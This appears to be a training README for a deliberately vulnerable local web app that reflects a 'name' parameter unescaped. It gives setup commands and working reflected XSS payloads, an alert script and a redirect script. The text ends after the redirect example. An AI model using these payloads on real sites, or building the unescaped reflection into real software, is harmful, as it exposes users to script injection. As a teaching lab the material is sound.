### How to run

In Ubuntu/Debian:

```
sudo apt-get install python3
mkdir xss
cd xss
python3 -m venv venv
venv/bin/pip3 install twisted
wget https://raw.githubusercontent.com/leonov-av/vuledap/main/XSS/xss.py
venv/bin/python3 xss.py
```
This should start a vulnerable application http://localhost:8880

### What does this app do
The application takes the name parameter from the GET request and greets the user by name.

http://localhost:8880?name=Alexander

```
$ curl "http://localhost:8880?name=Alexander"
<html><body>Hello Alexander!</body></html>
```

As you can see, we place the name into the html code without any filtering. So, we can add any html tags there. for example ```<b>Alexander</b>``` will make the text bold. In the same manner we can add some JavaScript there. 

### How to attack

Use Firefox browser for demo

1. Show allert message

http://localhost:8880/?name=%3Cscript%3Ealert%28%22123%22%29%3C%2Fscript%3E
```
$ curl "http://localhost:8880/?name=<script>alert("123")</script>"
<html><body>Hello <script>alert(123)</script>!</body></html>
```

2. Make redirection

http://localhost:8880/?name=%3Cscript%3Ewindow.location%20%3D%20%22http%3A%2F%2Fwww.avleonov.com%22%3C%2Fscript%3E

